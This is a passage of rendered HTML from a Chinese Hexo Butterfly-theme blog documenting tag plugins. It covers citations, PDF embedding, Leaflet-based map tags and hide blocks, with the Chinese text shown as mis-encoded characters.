class="code">`Volantis`</span>ä¸»é¢˜ä¼—å¼€å‘è€…ã€‚</span><br><span class="line">ä¸»è¦å‚è€ƒå†…å®¹åŒ…æ‹¬å„ä¸ªvolantisçš„å†…ç½®æ ‡ç­¾æ’ä»¶æ–‡æ¡£&#123;% referto &#x27;[5]&#x27;,&#x27;Volantisæ–‡æ¡£:å†…ç½®æ ‡ç­¾æ’ä»¶&#x27; %&#125;</span><br><span class="line">Butterflyä¸»é¢˜çš„å„ä¸ªè¡ç”Ÿé­”æ”¹&#123;% referto &#x27;[6]&#x27;,&#x27;Butterfly å®‰è£…æ–‡æ¡£:æ ‡ç­¾å¤–æŒ‚ï¼ˆTag Plugins&#x27; %&#125;&#123;% referto &#x27;[7]&#x27;,&#x27;å°å¼‹ã®ç”Ÿæ´»é¦†å…¨æ ·å¼é¢„è§ˆ&#x27; %&#125;&#123;% referto &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27; %&#125;&#123;% referto &#x27;[9]&#x27;,&#x27;å°åº·çš„butterflyä¸»é¢˜ä½¿ç”¨æ–‡æ¡£&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% referfrom &#x27;[1]&#x27;,&#x27;Akilarã®ç³–æœå±‹ç¾¤èŠç®€ä»‹&#x27;,&#x27;https://jq.qq.com/?<span class="emphasis">_wv=1027&amp;k=pGLB2C0N&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[2]&#x27;,&#x27;Hexoä¸­æ–‡æ–‡æ¡£&#x27;,&#x27;https://hexo.io/zh-cn/docs/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[3]&#x27;,&#x27;Butterfly å®‰è£…æ–‡æ¡£(ä¸€) å¿«é€Ÿå¼€å§‹&#x27;,&#x27;https://butterfly.js.org/posts/21cfbf15/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[4]&#x27;,&#x27;hexo-theme-volantis æ ‡ç­¾æ’ä»¶&#x27;,&#x27;https://volantis.js.org/v5/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[5]&#x27;,&#x27;Volantisæ–‡æ¡£:å†…ç½®æ ‡ç­¾æ’ä»¶&#x27;,&#x27;https://volantis.js.org/tag-plugins/&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[6]&#x27;,&#x27;Butterfly å®‰è£…æ–‡æ¡£:æ ‡ç­¾å¤–æŒ‚ï¼ˆTag Plugins&#x27;,&#x27;https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[7]&#x27;,&#x27;å°å¼‹ã®ç”Ÿæ´»é¦†å…¨æ ·å¼é¢„è§ˆ&#x27;,&#x27;https://lovelijunyi.gitee.io/posts/c898.html&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[8]&#x27;,&#x27;l-lin-font-awesome-animation&#x27;,&#x27;https://github.com/l-lin/font-awesome-animation&#x27; %&#125;</span></span><br><span class="line"><span class="emphasis">&#123;% referfrom &#x27;[9]&#x27;,&#x27;å°åº·çš„butterflyä¸»é¢˜ä½¿ç”¨æ–‡æ¡£&#x27;,&#x27;https://www.antmoe.com/posts/3b43914f/&#x27; %&#125;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>Akilarã®ç³–æœå±‹(akilar.top)æ˜¯ä¸€ä¸ªç§äººæ€§è´¨çš„åšå®¢<span class="hidden-anchor" id="referto_[1]"></span><sup class="reference"><a href="#referfrom_[1]">[1]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Akilarã®ç³–æœå±‹ç¾¤èŠç®€ä»‹</span><span class="reference-title">å‚è€ƒèµ„æ–™</span></span></span>ï¼Œä»å„ç±»æ•™ç¨‹è‡³ç”Ÿæ´»ç‚¹æ»´ï¼Œæ— è¯ä¸è°ˆã€‚å»ºç¾¤çš„ç›®çš„æ˜¯æä¾›ä¸€ä¸ªé—²èŠçš„åœºæ‰€ã€‚åšå®¢é‡‡ç”¨Hexoæ¡†æ¶<span class="hidden-anchor" id="referto_[2]"></span><sup class="reference"><a href="#referfrom_[2]">[2]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Hexoä¸­æ–‡æ–‡æ¡£</span><span class="reference-title">å‚è€ƒèµ„æ–™</span></span></span>ï¼ŒButterflyä¸»é¢˜<span class="hidden-anchor" id="referto_[3]"></span><sup class="reference"><a href="#referfrom_[3]">[3]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly å®‰è£…æ–‡æ¡£(ä¸€) å¿«é€Ÿå¼€å§‹</span><span class="reference-title">å‚è€ƒèµ„æ–™</span></span></span></p><p>æœ¬é¡¹ç›®å‚è€ƒäº†Volantis<span class="hidden-anchor" id="referto_[4]"></span><sup class="reference"><a href="#referfrom_[4]">[4]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">hexo-theme-volantis æ ‡ç­¾æ’ä»¶</span><span class="reference-title">å‚è€ƒèµ„æ–™</span></span></span>çš„æ ‡ç­¾æ ·å¼ã€‚å¼•å…¥<code>[tag].js</code>ï¼Œå¹¶é’ˆå¯¹<code>butterfly</code>ä¸»é¢˜ä¿®æ”¹äº†ç›¸åº”çš„<code>[tag].styl</code>ã€‚åœ¨æ­¤é¸£è°¢<code>Volantis</code>ä¸»é¢˜ä¼—å¼€å‘è€…ã€‚<br>ä¸»è¦å‚è€ƒå†…å®¹åŒ…æ‹¬å„ä¸ªvolantisçš„å†…ç½®æ ‡ç­¾æ’ä»¶æ–‡æ¡£<span class="hidden-anchor" id="referto_[5]"></span><sup class="reference"><a href="#referfrom_[5]">[5]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Volantisæ–‡æ¡£:å†…ç½®æ ‡ç­¾æ’ä»¶</span><span class="reference-title">å‚è€ƒèµ„æ–™</span></span></span><br>Butterflyä¸»é¢˜çš„å„ä¸ªè¡ç”Ÿé­”æ”¹<span class="hidden-anchor" id="referto_[6]"></span><sup class="reference"><a href="#referfrom_[6]">[6]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">Butterfly å®‰è£…æ–‡æ¡£:æ ‡ç­¾å¤–æŒ‚ï¼ˆTag Plugins</span><span class="reference-title">å‚è€ƒèµ„æ–™</span></span></span><span class="hidden-anchor" id="referto_[7]"></span><sup class="reference"><a href="#referfrom_[7]">[7]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">å°å¼‹ã®ç”Ÿæ´»é¦†å…¨æ ·å¼é¢„è§ˆ</span><span class="reference-title">å‚è€ƒèµ„æ–™</span></span></span><span class="hidden-anchor" id="referto_[8]"></span><sup class="reference"><a href="#referfrom_[8]">[8]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">l-lin-font-awesome-animation</span><span class="reference-title">å‚è€ƒèµ„æ–™</span></span></span><span class="hidden-anchor" id="referto_[9]"></span><sup class="reference"><a href="#referfrom_[9]">[9]</a></sup><span class="reference-bubble"><span class="reference-item"><span class="reference-literature">å°åº·çš„butterflyä¸»é¢˜ä½¿ç”¨æ–‡æ¡£</span><span class="reference-title">å‚è€ƒèµ„æ–™</span></span></span></p><div class="reference-source"><span class="hidden-anchor" id="referfrom_[1]"></span><a class="reference-anchor" href="#referto_[1]">[1]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://jq.qq.com/?_wv=1027&k=pGLB2C0N">Akilarã®ç³–æœå±‹ç¾¤èŠç®€ä»‹</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[2]"></span><a class="reference-anchor" href="#referto_[2]">[2]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://hexo.io/zh-cn/docs/">Hexoä¸­æ–‡æ–‡æ¡£</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[3]"></span><a class="reference-anchor" href="#referto_[3]">[3]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/21cfbf15/">Butterfly å®‰è£…æ–‡æ¡£(ä¸€) å¿«é€Ÿå¼€å§‹</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[4]"></span><a class="reference-anchor" href="#referto_[4]">[4]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/v5/tag-plugins/">hexo-theme-volantis æ ‡ç­¾æ’ä»¶</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[5]"></span><a class="reference-anchor" href="#referto_[5]">[5]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://volantis.js.org/tag-plugins/">Volantisæ–‡æ¡£:å†…ç½®æ ‡ç­¾æ’ä»¶</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[6]"></span><a class="reference-anchor" href="#referto_[6]">[6]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://butterfly.js.org/posts/4aa8abbe/#%E6%A8%99%E7%B1%A4%E5%A4%96%E6%8E%9B%EF%BC%88Tag-Plugins%EF%BC%89">Butterfly å®‰è£…æ–‡æ¡£:æ ‡ç­¾å¤–æŒ‚ï¼ˆTag Plugins</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[7]"></span><a class="reference-anchor" href="#referto_[7]">[7]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://lovelijunyi.gitee.io/posts/c898.html">å°å¼‹ã®ç”Ÿæ´»é¦†å…¨æ ·å¼é¢„è§ˆ</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[8]"></span><a class="reference-anchor" href="#referto_[8]">[8]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://github.com/l-lin/font-awesome-animation">l-lin-font-awesome-animation</a></div><div class="reference-source"><span class="hidden-anchor" id="referfrom_[9]"></span><a class="reference-anchor" href="#referto_[9]">[9]<div class="reference-anchor-up fa-solid fa-angles-up"></div></a><a class="reference-link" href="https://www.antmoe.com/posts/3b43914f/">å°åº·çš„butterflyä¸»é¢˜ä½¿ç”¨æ–‡æ¡£</a></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-29-PDFå±•ç¤º">2.29 PDFå±•ç¤º</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pdf æ–‡ä»¶è·¯å¾„ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>æ–‡ä»¶è·¯å¾„</code>: å¯ä»¥æ˜¯ç›¸å¯¹è·¯å¾„æˆ–è€…æ˜¯åœ¨çº¿é“¾æ¥</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 1.æœ¬åœ°æ–‡ä»¶:åœ¨mdæ–‡ä»¶è·¯å¾„ä¸‹åˆ›å»ºä¸€ä¸ªåŒåæ–‡ä»¶å¤¹ï¼Œå…¶å†…æ”¾pdfæ–‡ä»¶åä¸ºxxx.pdfçš„æ–‡ä»¶</span></span><br><span class="line">&#123;% pdf xxx.pdf %&#125;</span><br><span class="line"><span class="section"># 2.åœ¨çº¿é“¾æ¥</span></span><br><span class="line">&#123;% pdf https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/å°ä½œæ–‡è®²ä¹‰.pdf %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>2.åœ¨çº¿é“¾æ¥(è¦æ”¾åˆ°æœ€å¤–å±‚æ‰èƒ½èµ·ä½œç”¨)</p><pre><code>&lt;div class=&quot;row&quot;&gt;&lt;embed src=&quot;https://cdn.jsdelivr.net/gh/Justlovesmile/CDN/pdf/å°ä½œæ–‡è®²ä¹‰.pdf&quot; width=&quot;100%&quot; height=&quot;550&quot; type=&quot;application/pdf&quot;&gt;&lt;/div&gt;</code></pre><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-30-Hexo-tag-map-æ’ä»¶">2.30 Hexo-tag-map æ’ä»¶</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% + æ ‡ç­¾å€¼ + ç»åº¦ + çº¬åº¦ + æ–‡æœ¬ + ç¼©æ”¾ç­‰çº§ + å®½ + é«˜ + é»˜è®¤å›¾å±‚ + %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><table><thead><tr><th style="text-align:center">åœ°å›¾å</th><th style="text-align:center">æ ‡ç­¾å€¼ &lt;å¿…å¡«&gt;</th><th style="text-align:center">å®½ (é»˜è®¤ 100%) / é«˜ (é»˜è®¤ 360px)</th><th style="text-align:center">ç¼©æ”¾ç­‰çº§ (é»˜è®¤ 14)</th><th style="text-align:center">å®½ (é»˜è®¤ 100%) / é«˜ (é»˜è®¤ 360px)</th><th style="text-align:center">é»˜è®¤å›¾å±‚ (é»˜è®¤ 1)</th></tr></thead><tbody><tr><td style="text-align:center">æ··åˆåœ°å›¾</td><td style="text-align:center">map</td><td style="text-align:center">ç™¾åˆ†æ•°æˆ–å…·ä½“å€¼ (100% æˆ– 360px)</td><td style="text-align:center">å–å€¼ 3~18</td><td style="text-align:center">ç™¾åˆ†æ•°æˆ–å…·ä½“å€¼ (100% æˆ– 360px)</td><td style="text-align:center">å–å€¼ 1~7</td></tr><tr><td style="text-align:center">è°·æ­Œåœ°å›¾</td><td style="text-align:center">googleMap</td><td style="text-align:center">ç™¾åˆ†æ•°æˆ–å…·ä½“å€¼ (100% æˆ– 360px)</td><td style="text-align:center">å–å€¼ 1~20</td><td style="text-align:center">ç™¾åˆ†æ•°æˆ–å…·ä½“å€¼ (100% æˆ– 360px)</td><td style="text-align:center">å–å€¼ 1~3</td></tr><tr><td style="text-align:center">é«˜å¾·åœ°å›¾</td><td style="text-align:center">gaodeMap</td><td style="text-align:center">ç™¾åˆ†æ•°æˆ–å…·ä½“å€¼ (100% æˆ– 360px)</td><td style="text-align:center">å–å€¼ 3~18</td><td style="text-align:center">ç™¾åˆ†æ•°æˆ–å…·ä½“å€¼ (100% æˆ– 360px)</td><td style="text-align:center">å–å€¼ 1~3</td></tr><tr><td style="text-align:center">ç™¾åº¦åœ°å›¾</td><td style="text-align:center">baiduMap</td><td style="text-align:center">ç™¾åˆ†æ•°æˆ–å…·ä½“å€¼ (100% æˆ– 360px)</td><td style="text-align:center">å–å€¼ 4~18</td><td style="text-align:center">ç™¾åˆ†æ•°æˆ–å…·ä½“å€¼ (100% æˆ– 360px)</td><td style="text-align:center">å–å€¼ 1~2</td></tr><tr><td style="text-align:center">Geoq åœ°å›¾</td><td style="text-align:center">geoqMap</td><td style="text-align:center">ç™¾åˆ†æ•°æˆ–å…·ä½“å€¼ (100% æˆ– 360px)</td><td style="text-align:center">å–å€¼ 1~18</td><td style="text-align:center">ç™¾åˆ†æ•°æˆ–å…·ä½“å€¼ (100% æˆ– 360px)</td><td style="text-align:center">å–å€¼ 1~5</td></tr><tr><td style="text-align:center">openstreet åœ°å›¾</td><td style="text-align:center">openstreetMap</td><td style="text-align:center">ç™¾åˆ†æ•°æˆ–å…·ä½“å€¼ (100% æˆ– 360px)</td><td style="text-align:center">å–å€¼ 1~18</td><td style="text-align:center">ç™¾åˆ†æ•°æˆ–å…·ä½“å€¼ (100% æˆ– 360px)</td><td style="text-align:center">ä¸æ”¯æŒæ­¤å‚æ•°</td></tr></tbody></table><ol><li>å‚æ•°ä¹‹é—´ï¼Œç”¨è‹±æ–‡é€—å·ç›¸éš”</li><li>å‚æ•°å¿…é¡»æŒ‰ä¸Šè¿°äº‹ä¾‹é¡ºåºè¾“å…¥ï¼Œä¸å¾—ä¸ºç©º</li><li>åŒä¸€ä¸ªé¡µé¢ï¼ŒåŒä¸€ç»„ç»çº¬åº¦å€¼ï¼Œåªèƒ½æ’å…¥ä¸€ä¸ªç›¸åŒæ ‡ç­¾å€¼çš„åœ°å›¾ (è‹¥æœ‰éœ€è¦ï¼Œå¯ä»¥å°†ç¬¬äºŒä¸ªåœ°å›¾ä¸Šï¼Œç»åº¦æˆ–çº¬åº¦æœ«å°¾åˆ é™¤ä¸€ä¸¤ä¸ªæ•°)</li><li>å‚æ•°å–å€¼å¿…é¡»åœ¨ä¸Šè¿°èŒƒå›´å†…</li><li>é»˜è®¤å›¾å±‚ï¼šå³åœ°å›¾å åŠ å±‚çš„å€¼ï¼Œé»˜è®¤å¸¸è§„åœ°å›¾è¿˜æ˜¯å«æ˜Ÿåœ°å›¾ï¼Œå¯æŒ‰åœ°å›¾æ˜¾ç¤ºé¡ºåºå–å€¼</li><li>ç¼©æ”¾ç­‰çº§ï¼Œæ•°å­—è¶Šå¤§ï¼Œåœ°å›¾æ¯”ä¾‹å°ºè¶Šå°ï¼Œæ˜¾ç¤ºçš„è¶Šç²¾ç»†</li><li>é™¤æ ‡ç­¾å€¼å¤–ï¼Œå…¶ä»–å‚æ•°é€‰å¡«ï¼Œä½† æ¯ä¸ªå‚æ•°çš„å·¦è¾¹çš„å‚æ•°å¿…å¡«</li><li>è°·æ­Œåœ°å›¾éœ€è¦å¤–ç½‘æ‰èƒ½åŠ è½½æŸ¥çœ‹</li></ol><p>åæ ‡è·å–ï¼š<a href="https://lbs.amap.com/tools/picker">é«˜å¾·åœ°å›¾åæ ‡æ‹¾å–ç³»ç»Ÿ</a> ã€<a href="https://api.map.baidu.com/lbsapi/getpoint/index.html">ç™¾åº¦åœ°å›¾åæ ‡æ‹¾å–ç³»ç»Ÿ</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% map 120.101101,30.239119 %&#125;</span><br><span class="line">&#123;% googleMap 120.101101,30.239119, è¿™é‡Œæ˜¯è¥¿æ¹–çµéšå¯ºï¼Œæ®è¯´æ±‚å§»ç¼˜å¾ˆçµéªŒå“¦ï¼ %&#125;</span><br><span class="line">&#123;% geoqMap 120.101101,30.239119, è¿™é‡Œæ˜¯è¥¿æ¹–çµéšå¯ºï¼Œæ®è¯´æ±‚å§»ç¼˜å¾ˆçµéªŒå“¦ï¼, 13, 90%, 320px, 3 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div class="map-box" style="margin: 0.8rem 0 1.6rem 0;"><div id="map-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div></div><script type="text/javascript">var normalm=L.tileLayer.chinaProvider('GaoDe.Normal.Map',{maxZoom:20,minZoom:1,attribution:'é«˜å¾·åœ°å›¾'});var imgm=L.tileLayer.chinaProvider('GaoDe.Satellite.Map',{maxZoom:20,minZoom:1,attribution:'é«˜å¾·åœ°å›¾'});var imga=L.tileLayer.chinaProvider('GaoDe.Satellite.Annotion',{maxZoom:20,minZoom:1,attribution:'é«˜å¾·åœ°å›¾'});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:20,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'});routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1});var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:21,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:21,minZoom:1,attribution:'Google Maps'});var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:21,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm]),image=L.layerGroup([imgm,imga]);var baseLayers={"é«˜å¾·åœ°å›¾":normal,"æ™ºå›¾åœ°å›¾":normalm1,"è°·æ­Œåœ°å›¾":normalMap,"é«˜å¾·å«æ˜Ÿåœ°å›¾":imgm,"è°·æ­Œå«æ˜Ÿåœ°å›¾":satelliteMap,"é«˜å¾·å«æ˜Ÿæ ‡æ³¨":image,"è°·æ­Œå«æ˜Ÿæ ‡æ³¨":routeMap};var mymap=L.map('map-120.101101-30.239119',{center:[30.239119,120.101101],zoom:14,layers:[normal],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'æ”¾å¤§',zoomOutTitle:'ç¼©å°'}).addTo(mymap);</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="googleMap-120.101101-30.239119" style="max-width:100%; height:360px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalMap=L.tileLayer.chinaProvider('Google.Normal.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),satelliteMap=L.tileLayer.chinaProvider('Google.Satellite.Map',{maxZoom:22,minZoom:1,attribution:'Google Maps'}),routeMap=L.tileLayer.chinaProvider('Google.Satellite.Annotion',{maxZoom:22,minZoom:1,attribution:'Google Maps'});var baseLayers={"è°·æ­Œåœ°å›¾":normalMap,"è°·æ­Œå«æ˜Ÿå›¾":satelliteMap,"è°·æ­Œå«æ˜Ÿæ ‡æ³¨": routeMap};var overlayLayers={};var mymap=L.map("googleMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:14,layers:[normalMap],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'æ”¾å¤§',zoomOutTitle:'ç¼©å°'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("è¿™é‡Œæ˜¯è¥¿æ¹–çµéšå¯ºï¼Œæ®è¯´æ±‚å§»ç¼˜å¾ˆçµéªŒå“¦ï¼").openPopup();</script><br><link rel="stylesheet" href="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.css"><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet@1.7.1.js"></script><script data-pjax src="//unpkg.com/hexo-tag-map/lib/leaflet.ChineseTmsProviders@1.0.4.js"></script><div id="geoqMap-120.101101-30.239119" style="max-width:90%; height:320px;display: block;margin:0 auto;z-index:1;border-radius: 5px;"></div><script type="text/javascript">var normalm1=L.tileLayer.chinaProvider('Geoq.Normal.Map',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm2=L.tileLayer.chinaProvider('Geoq.Normal.PurplishBlue',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm3=L.tileLayer.chinaProvider('Geoq.Normal.Gray',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm4=L.tileLayer.chinaProvider('Geoq.Normal.Warm',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normalm5=L.tileLayer.chinaProvider('Geoq.Theme.Hydro',{maxZoom:20,minZoom:1,attribution:'GeoQ'});var normal=L.layerGroup([normalm1,normalm2,normalm3,normalm4,normalm5]);var baseLayers={"æ™ºå›¾åœ°å›¾":normalm1,"åˆå¤œè“":normalm2,"ç°è‰²":normalm3,"æš–è‰²":normalm4,"æ°´ç³»":normalm5};var mymap=L.map("geoqMap-120.101101-30.239119",{center:[30.239119,120.101101],zoom:13,layers:[normalm3],zoomControl:false});L.control.layers(baseLayers,null).addTo(mymap);L.control.zoom({zoomInTitle:'æ”¾å¤§',zoomOutTitle:'ç¼©å°'}).addTo(mymap);var marker = L.marker(['30.239119','120.101101']).addTo(mymap);marker.bindPopup("è¿™é‡Œæ˜¯è¥¿æ¹–çµéšå¯ºï¼Œæ®è¯´æ±‚å§»ç¼˜å¾ˆçµéªŒå“¦ï¼").openPopup();</script><br><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-31-éšè—å—">2.31 éšè—å—</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">å‚æ•°é…ç½®</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock display,bg,color %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li>contentï¼šè¦éšè—çš„å†…å®¹</li><li>displayï¼šå±•ç¤ºå‰æŒ‰é’®æ˜¾ç¤ºçš„æ–‡å­—ï¼ˆå¯é€‰ï¼‰</li><li>bgï¼šæŒ‰é’®çš„èƒŒæ™¯é¢œè‰²ï¼ˆå¯é€‰ï¼‰</li><li>colorï¼šæŒ‰é’®æ˜¾ç¤ºçš„æ–‡å­—çš„é¢œè‰²ï¼ˆå¯é€‰ï¼‰</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% hideBlock ç‚¹æˆ‘é¢„è§ˆ, blue %&#125;</span><br><span class="line">è¿™é‡Œæœ‰å¼ å›¾ç‰‡ï¼š</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;image (1)&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:67%;&quot;</span> /&gt;</span></span></span><br><span class="line">&#123;% endhideBlock %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><div class="hide-block"><button type="button" class="hide-button" style="background-color:  blue;">ç‚¹æˆ‘é¢„è§ˆ    </button><div class="hide-content"><p>è¿™é‡Œæœ‰å¼ å›¾ç‰‡ï¼š<br><img src="https://s1.vika.cn/space/2022/10/30/b35fce448bc9404a8d65c3ce1e6e46eb" alt="image (1)" style="zoom:67%;" /></p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas 